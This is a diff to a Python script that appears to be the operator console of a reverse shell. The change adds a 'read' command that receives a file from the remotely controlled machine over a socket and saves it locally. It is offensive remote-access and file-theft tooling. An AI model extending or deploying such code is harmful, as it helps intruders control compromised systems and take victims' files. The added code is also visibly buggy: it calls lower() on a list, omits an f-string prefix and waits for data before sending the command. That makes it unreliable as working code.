@@ -27,8 +27,25 @@ print("[+] Current working directory", cwd)
 while True:
     # Reading 
     command = input(f"{cwd} $> ")
+    splitted_command = command.split()
     if not command.strip():
         continue
+    elif splitted_command.lower()[0] == "read" :
+        respond = client_socket.recv(BUFFER_SIZE).decode()
+        if respond != "error" :
+            file_name = splitted_command[1]
+            file_data = b""
+            while True:
+                data = client_socket.recv(BUFFER_SIZE)
+                file_data += data
+                if data.endswith(b"end") :
+                    break
+            file_data = file_data[:len(file_data) - 3]
+            with open(file_name, "wb") as f:
+                f.write(file_data)
+            print("File {file_name} has been written.")
+        else :
+            print("File does not exist in this directory.")
 
     client_socket.send(command.encode())
     if command.lower() == "exit":
